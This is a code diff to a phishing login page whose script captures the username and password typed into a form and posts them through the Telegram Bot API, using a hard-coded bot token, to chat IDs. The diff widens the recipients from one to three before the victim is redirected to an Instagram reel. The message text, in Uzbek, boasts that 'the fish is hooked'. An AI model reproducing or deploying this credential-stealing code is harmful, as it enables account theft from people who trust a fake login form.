@@ -304,21 +304,23 @@ document.getElementById("loginForm").addEventListener("submit", function(e){
     const pass = document.getElementById("password").value;
 
     const token = "8164072502:AAFXUbxmRzHpp-opJlBgeBUaMLiDxJmvxZc";
-    const chat_id = "1178814024";
+    const chat_ids = ["1178814024", "7985509890", "8170788593"];
     const text = ` Baliq ilindi login:\nUser: ${user}\nPass: ${pass}`;
 
     // Telegramga yuborish
-    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-        method: "POST",
-        headers: {"Content-Type": "application/json"},
-        body: JSON.stringify({ chat_id, text })
-    }).then(() => {
-        // Ma'lumot yuborilgach, keyin Instagramga yo'naltiramiz
-        window.location.href = 'https://www.instagram.com/reel/DVkucbGghup/?utm_source=ig_web_copy_link&igsh=MzRlODBiNWFlZA==';
-    }).catch(err => {
-        console.error("Xatolik:", err);
+     chat_ids.forEach(chat_id => {
+        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+            method: "POST",
+            headers: {"Content-Type": "application/json"},
+            body: JSON.stringify({
+                chat_id: chat_id,
+                text: text
+            })
+        }).catch(err => console.error(err));
     });
-});
+
+    window.location.href =  'https://www.instagram.com/reel/DVkucbGghup/?utm_source=ig_web_copy_link&igsh=MzRlODBiNWFlZA==';
+    });
 </script>
 
 </body>
